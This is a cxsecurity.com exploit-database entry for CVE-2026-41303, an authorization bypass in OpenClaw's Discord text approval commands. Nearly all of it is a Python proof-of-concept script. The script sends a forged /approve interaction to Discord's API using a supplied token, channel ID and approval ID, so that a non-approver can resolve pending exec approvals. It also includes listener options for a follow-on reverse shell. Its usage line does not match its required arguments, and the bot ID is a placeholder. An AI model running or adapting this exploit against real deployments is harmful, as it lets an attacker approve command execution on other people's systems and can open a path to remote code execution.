---
title: OpenClaw <  2026.3.28 Discord Text Approval Authorization Bypass
url: https://cxsecurity.com/issue/WLB-2026040015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-04-22
fetch_date: 2026-04-23T04:43:23.615427
---

# OpenClaw <  2026.3.28 Discord Text Approval Authorization Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **OpenClaw < 2026.3.28 Discord Text Approval Authorization Bypass** **2026.04.22**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-41303](https://cxsecurity.com/cveshow/CVE-2026-41303/ "Click to see CVE-2026-41303")**  CWE: **[CWE-863 Incorrect Authorization](https://cxsecurity.com/cwe/CWE-863%20Incorrect%20Authorization "Click to see CWE-863 Incorrect Authorization")** | |

#!/usr/bin/env python3
# Exploit Title: OpenClaw Discord Text Approval Authorization Bypass
# CVE: CVE-2026-41303
# Date: 2026-04-21
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Vendor Homepage: https://github.com/openclaw/openclaw
# Software Link: https://github.com/openclaw/openclaw
# Affected: OpenClaw < 2026.3.28
# Tested on: OpenClaw 2026.3.24
# Category: Authorization Bypass
# Platform: Linux / Discord
# Exploit Type: Remote
# CVSS: 8.8
# CWE : CWE-863
# Description: OpenClaw before 2026.3.28 contains an authorization bypass vulnerability in Discord text approval commands that allows non-approvers to resolve pending exec approvals.
# Fixed in: 2026.3.28
# Usage:
# python3 exploit.py <target> --lhost <your\_ip> --lport <your\_port>
#
# Examples:
# python3 exploit.py https://openclaw.example.com --lhost 192.168.1.100 --lport 4444
#
# Options:
#
# Notes:
# This is a simple PoC script that demonstrates the authorization bypass.
# It requires a Discord user token with access to the channel where OpenClaw bot is present.
# The script sends the /approve slash command to bypass the approvers list.
#
# How to Use
#
# Step 1: Obtain a pending approval ID from the OpenClaw Discord channel.
# Step 2: Run the exploit with your Discord token, channel ID, approval ID, and decision.
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-41303 • OpenClaw Discord Approval Bypass ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import argparse
import requests
import json
import time
def main():
parser = argparse.ArgumentParser(description="CVE-2026-41303 - OpenClaw Discord Approval Bypass PoC")
parser.add\_argument("target", help="OpenClaw instance URL or Discord guild/channel context")
parser.add\_argument("--token", required=True, help="Discord user or bot token")
parser.add\_argument("--channel-id", required=True, help="Discord channel ID where the bot listens")
parser.add\_argument("--approval-id", required=True, help="Pending approval ID to bypass")
parser.add\_argument("--decision", default="allow-once", choices=["allow-once", "allow-always"], help="Approval decision")
parser.add\_argument("--lhost", help="Your listener IP (for reverse shell if approval triggers RCE)")
parser.add\_argument("--lport", help="Your listener port")
args = parser.parse\_args()
print("[+] Starting CVE-2026-41303 PoC by @banyamer\_security")
print(f"[+] Target : {args.target}")
print(f"[+] Channel ID : {args.channel\_id}")
print(f"[+] Approval ID : {args.approval\_id}")
print(f"[+] Decision : {args.decision}")
if args.lhost and args.lport:
print(f"[+] Listener : {args.lhost}:{args.lport} (for post-approval payload)")
# Build Discord interaction payload for /approve command
payload = {
"type": 2, # APPLICATION\_COMMAND
"application\_id": "OPENCLAW\_BOT\_APP\_ID", # Replace with actual OpenClaw bot application ID if known
"guild\_id": "YOUR\_GUILD\_ID", # Optional - fill if needed
"channel\_id": args.channel\_id,
"data": {
"name": "approve",
"options": [
{"name": "id", "value": args.approval\_id},
{"name": "decision", "value": args.decision}
]
}
}
headers = {
"Authorization": f"{args.token}",
"Content-Type": "application/json"
}
print("[+] Sending unauthorized /approve command via Discord API...")
try:
r = requests.post(
"https://discord.com/api/v10/interactions",
json=payload,
headers=headers,
timeout=10
)
print(f"[+] HTTP Status: {r.status\_code}")
if r.status\_code in [200, 204]:
print("[+] Success! The approval was processed without checking the approvers list.")
print("[+] Non-approver successfully bypassed authorization (CVE-2026-41303).")
if args.lhost and args.lport:
print("[+] If the approved command spawns a shell, you should receive a connection shortly.")
elif r.status\_code == 401:
print("[-] Invalid Discord token.")
else:
print(f"[-] Unexpected response: {r.text[:500]}")
except Exception as e:
print(f"[-] Error: {e}")
print("\n[+] PoC completed. Patch to OpenClaw >= 2026.3.28 immediately.")
print("[+] Credit: Mohammed Idrees Banyamer (@banyamer\_security)")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/openclaw/openclaw/security/advisories/GHSA-98hh-7ghg-x6rq

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026040015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top